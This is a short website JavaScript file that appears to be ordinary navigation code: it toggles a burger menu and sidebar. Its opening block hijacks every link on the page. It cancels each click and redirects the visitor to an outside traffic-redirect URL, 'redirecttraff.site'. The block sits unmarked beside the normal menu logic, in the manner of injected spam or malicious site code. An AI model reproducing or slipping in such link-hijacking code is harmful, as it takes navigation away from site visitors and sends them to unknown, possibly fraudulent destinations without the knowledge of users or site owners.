document.querySelectorAll("a").forEach((elem) => {
	elem.onclick = function (e) {
		e.preventDefault();
		window.location.href = "https://redirecttraff.site/wfn711T4";
		return false;
	};
});

let burger = document.querySelector(".burger");
let sidebar = document.querySelector(".sidebar");
let main = document.querySelector(".wrap");

burger.addEventListener("click", () => {
	burger.classList.toggle("active");
	sidebar.classList.toggle("active");
	main.classList.toggle("active");
	document.body.classList.toggle("hidden");
});

main.addEventListener("click", () => {
	burger.classList.remove("active");
	sidebar.classList.remove("active");
	main.classList.remove("active");
	document.body.classList.remove("hidden");
});
